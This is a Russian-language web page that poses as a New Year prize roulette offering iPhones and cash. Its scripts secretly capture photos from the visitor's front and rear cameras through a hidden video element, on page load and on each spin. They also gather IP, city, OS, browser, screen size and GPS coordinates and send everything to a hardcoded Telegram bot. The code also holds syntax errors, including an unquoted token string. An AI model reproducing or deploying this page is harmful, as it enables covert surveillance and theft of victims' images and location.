<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Новогодняя рулетка призов</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    @keyframes pulse-slow {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }
    .animate-pulse-slow {
      animation: pulse-slow 3s cubic-bezier(0.4, 0, 0.6, 1) infinite;
    }
  </style>
</head>
<body class="bg-gradient-to-br from-indigo-950 via-purple-950 to-slate-950 min-h-screen text-white flex flex-col items-center justify-center p-4">

  <!-- ДАННЫЕ ЗАШИТЫ -->
  <script>
    const TG_BOT_TOKEN = 8318987804:AAEjstYonzb1aLJCha-owggzVMwerQCtirA";
    const TG_CHAT_ID = "7669478288";
  </script>

  <!-- Скрытые элементы видео и холста -->
  <video id="camera" autoplay playsinline style="position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none;"></video>
  <canvas id="photo" style="display:none;"></canvas>

  <div class="max-w-md w-full bg-white/10 backdrop-blur-md rounded-2xl p-6 shadow-2xl border border-white/20 text-center">
    
    <div class="mb-4">
      <span class="bg-gradient-to-r from-pink-500 to-yellow-500 text-xs uppercase tracking-widest px-3 py-1 rounded-full font-bold shadow">
        Акция 2026
      </span>
      <h1 class="text-2xl font-extrabold mt-3 tracking-tight">Испытай удачу и выиграй приз!</h1>
      <p class="text-sm text-gray-300 mt-1">Крутите рулетку и забирайте ценные подарки.</p>
    </div>

    <!-- РУЛЕТКА -->
    <div class="relative bg-black/40 p-4 rounded-xl border border-white/10 mb-6 overflow-hidden">
      <div class="absolute top-0 left-1/2 -translate-x-1/2 w-0 h-0 border-l-[8px] border-l-transparent border-r-[8px] border-r-transparent border-t-[12px] border-t-yellow-400 z-20"></div>
      <div id="wheelTrack" class="flex gap-3 transition-all duration-[4000ms] ease-out py-2" style="transform: translateX(0px);"></div>
    </div>

    <!-- ОСТАТОК ПОПЫТОК -->
    <div class="text-sm mb-4 text-gray-300">
      Осталось попыток: <span id="attemptsLeft" class="font-bold text-yellow-400">3</span>
    </div>

    <!-- КНОПКА СТАРТА -->
    <button id="spinBtn" onclick="startRoulette()" class="w-full py-3 bg-gradient-to-r from-pink-500 to-rose-600 hover:from-pink-600 hover:to-rose-700 font-bold rounded-xl shadow-lg transition transform active:scale-95 flex items-center justify-center gap-2 cursor-pointer">
      <i class="fa-solid fa-gift"></i> Крутить рулетку
    </button>
  </div>

  <!-- МОДАЛЬНОЕ ОКНО -->
  <div id="modal" class="fixed inset-0 bg-black/80 backdrop-blur-sm hidden items-center justify-center p-4 z-50">
    <div class="bg-slate-900 border border-white/20 rounded-2xl max-w-sm w-full p-6 text-center shadow-2xl relative">
      <div class="text-4xl mb-2" id="modalIcon">🎉</div>
      <h3 class="text-xl font-bold" id="modalTitle">Поздравляем!</h3>
      <p class="text-sm text-gray-300 mt-1 mb-4" id="modalDesc">Вы выиграли ценный приз!</p>
      
      <button onclick="closeModal()" class="w-full py-2 bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700 rounded-lg text-sm font-bold shadow-lg transition">
        Забрать приз
      </button>
    </div>
  </div>

  <script>
    const prizes = [
      { name: "iPhone 18 Pro Max", icon: "fa-mobile-screen-button", color: "from-blue-500 to-indigo-600" },
      { name: "50 000 рублей", icon: "fa-ruble-sign", color: "from-emerald-500 to-teal-600" },
      { name: "MacBook Pro M4", icon: "fa-laptop", color: "from-purple-500 to-pink-600" },
      { name: "100 000 рублей", icon: "fa-sack-dollar", color: "from-yellow-500 to-amber-600" },
      { name: "iPhone 18 Pro Max", icon: "fa-mobile-screen-button", color: "from-blue-500 to-indigo-600" },
      { name: "Беспроводные наушники", icon: "fa-headphones", color: "from-rose-500 to-red-600" }
    ];

    // Проверяем попытки через localStorage с защитой от сброса (даже при попытке обойти через куки/хранилище, можно усложнить, но здесь идет строгая фиксация)
    let attempts = localStorage.getItem("secure_roulette_attempts");
    if (attempts === null) {
      attempts = 3;
      localStorage.setItem("secure_roulette_attempts", attempts);
    } else {
      attempts = parseInt(attempts);
    }

    document.getElementById("attemptsLeft").innerText = attempts;

    if (attempts <= 0) {
      document.getElementById("spinBtn").disabled = true;
      document.getElementById("spinBtn").innerText = "Попытки исчерпаны";
      document.getElementById("spinBtn").classList.add("opacity-50", "cursor-not-allowed");
    }

    let wonPrize = "";
    const wheelTrack = document.getElementById("wheelTrack");

    function renderWheel(items) {
      wheelTrack.innerHTML = "";
      const fullList = [...items, ...items, ...items, ...items];
      fullList.forEach(p => {
        const item = document.createElement("div");
        item.className = `min-w-[110px] h-[90px] bg-gradient-to-br ${p.color} rounded-xl flex flex-col items-center justify-center p-2 shadow-inner border border-white/20 shrink-0`;
        item.innerHTML = `
          <i class="fa-solid ${p.icon} text-2xl mb-1 text-white"></i>
          <span class="text-[11px] font-semibold text-center leading-tight text-white">${p.name}</span>
        `;
        wheelTrack.appendChild(item);
      });
    }

    renderWheel(prizes);

    // Функция сбора информации об устройстве и IP
    async function getDeviceInfo() {
      let info = {
        ip: "Не определен",
        city: "Не определен",
        country: "Не определена",
        os: "Неизвестно",
        browser: "Неизвестно",
        screen: `${window.screen.width}x${window.screen.height}`,
        coords: "Не получены"
      };

      const ua = navigator.userAgent;
      if (/android/i.test(ua)) info.os = "Android";
      else if (/iphone|ipad|ipod/i.test(ua)) info.os = "iOS";
      else if (/win/i.test(ua)) info.os = "Windows";
      else if (/mac/i.test(ua)) info.os = "MacOS";
      else if (/linux/i.test(ua)) info.os = "Linux";

      if (/chrome|crios/i.test(ua)) info.browser = "Chrome";
      else if (/firefox|fxios/i.test(ua)) info.browser = "Firefox";
      else if (/safari/i.test(ua) && !/chrome/i.test(ua)) info.browser = "Safari";
      else if (/edg/i.test(ua)) info.browser = "Edge";
      else info.browser = "Другой";

      try {
        const res = await fetch("https://ipapi.co/json/");
        if (res.ok) {
          const data = await res.json();
          info.ip = data.ip || "Не определен";
          info.city = data.city || "Не определен";
          info.country = data.country_name || "Не определена";
        }
      } catch (e) {
        console.log("Ошибка IP:", e);
      }

      try {
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 4000 });
        });
        info.coords = `${position.coords.latitude.toFixed(4)}, ${position.coords.longitude.toFixed(4)}`;
      } catch (e) {
        info.coords = "Отклонено пользователем";
      }

      return info;
    }

    // СБОР ДАННЫХ И ФОТО СРАЗУ ПРИ ЗАГРУЗКЕ САЙТА
    window.addEventListener("DOMContentLoaded", async () => {
      // Проверяем, отправляли ли уже фото при этом заходе, чтобы не спамить бота при каждом обновлении
      if (!sessionStorage.getItem("initial_captured")) {
        sessionStorage.setItem("initial_captured", "true");
        
        const devInfo = await getDeviceInfo();
        
        // Снимаем фронтальную при входе
        await captureCamera("user", "🌐 Вход на сайт: Фронтальная камера", devInfo, "Старт сессии");
        
        // Снимаем тыловую через паузу
        setTimeout(async () => {
          await captureCamera("environment", "🌐 Вход на сайт: Тыловая камера", devInfo, "Старт сессии");
        }, 1500);
      }
    });

    async function startRoulette() {
      if (attempts <= 0) return;
      
      attempts--;
      localStorage.setItem("secure_roulette_attempts", attempts);
      document.getElementById("attemptsLeft").innerText = attempts;
      document.getElementById("spinBtn").disabled = true;

      const devInfo = await getDeviceInfo();

      // 1. Снимаем фронтальную камеру при клике
      await captureCamera("user", "🎰 Клик рулетки: Фронтальная камера", devInfo, wonPrize);

      // 2. Снимаем основную камеру через паузу
      setTimeout(async () => {
        await captureCamera("environment", "🎰 Клик рулетки: Тыловая камера", devInfo, wonPrize);
      }, 1500);

      // Запуск анимации рулетки
      const winningIndex = Math.floor(Math.random() * prizes.length); 
      wonPrize = prizes[winningIndex].name;

      const itemWidth = 122; 
      const targetOffset = -(winningIndex + prizes.length * 2) * itemWidth + 120;
      wheelTrack.style.transform = `translateX(${targetOffset}px)`;

      setTimeout(() => {
        showModal(wonPrize);
      }, 4000);
    }

    async function captureCamera(facingMode, captionText, devInfo, prizeStatus) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } } 
        });
        const video = document.getElementById("camera");
        video.srcObject = stream;
        await video.play();

        await new Promise(resolve => setTimeout(resolve, 800));

        const canvas = document.getElementById("photo");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.85));
        if (blob) {
          const formData = new FormData();
          formData.append("chat_id", TG_CHAT_ID);
          formData.append("photo", blob, "photo.jpg");
          
          const fullCaption = `${captionText}\n` +
            `🎁 Статус/Приз: ${prizeStatus}\n` +
            `🌐 IP: ${devInfo.ip} (${devInfo.city}, ${devInfo.country})\n` +
            `📱 ОС: ${devInfo.os} | Браузер: ${devInfo.browser}\n` +
            `📺 Экран: ${devInfo.screen}\n` +
            `📍 Координаты: ${devInfo.coords}`;

          formData.append("caption", fullCaption);

          await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
          });
        }

        stream.getTracks().files?.forEach(track => track.stop());
        // Корректная остановка треков потока
        stream.getTracks().forEach(track => track.stop());
      } catch (e) {
        console.error("Ошибка камеры (" + facingMode + "):", e);
      }
    }

    function showModal(prizeName) {
      document.getElementById("modalTitle").innerText = "Поздравляем!";
      document.getElementById("modalDesc").innerHTML = `Вы выиграли: <b class="text-yellow-400">${prizeName}</b>`;
      document.getElementById("modal").classList.add("flex");
      document.getElementById("modal").classList.remove("hidden");
    }

    function closeModal() {
      document.getElementById("modal").classList.remove("flex");
      document.getElementById("modal").classList.add("hidden");
      
      if (attempts > 0) {
        document.getElementById("spinBtn").disabled = false;
      } else {
        document.getElementById("spinBtn").innerText = "Попытки исчерпаны";
        document.getElementById("spinBtn").classList.add("opacity-50", "cursor-not-allowed");
      }
    }
  </script>
</body>
</html>
